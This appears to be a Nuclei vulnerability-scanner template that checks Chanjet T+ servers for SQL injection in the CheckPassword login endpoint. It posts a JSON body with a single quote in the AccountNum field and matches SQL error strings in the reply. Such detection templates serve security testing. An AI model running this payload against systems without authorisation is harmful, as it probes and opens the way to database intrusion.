id: poc-yaml-chanjet-tplus-check-password-sqli
info:
  name: Chanjet Tplus CheckPassword SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

http:
  - method: POST
    path:
      - "/tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword"
    headers:
      Content-Type: text/plain
      Cookie: ASP.NET_SessionId=; sid=admin; HOST=null;
    body: |
      {
        "AccountNum":"1'",
        "UserName":"admin",
        "Password":"e10adc3949ba59abbe56e057f20f883e",
        "rdpYear":"2022",
        "rdpMonth":"2",
        "rdpDate":"21",
        "webServiceProcessID":"admin",
        "ali_csessionid":"",
        "ali_sig":"",
        "ali_token":"",
        "ali_scene":"",
        "role":"",
        "aqdKey":"",
        "formWhere":"browser",
        "cardNo":""
      }
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "order by cAcc_Num"
          - "引号不完整"
        part: body
      - type: word
        words:
          - "<"
        part: body
        negative: true
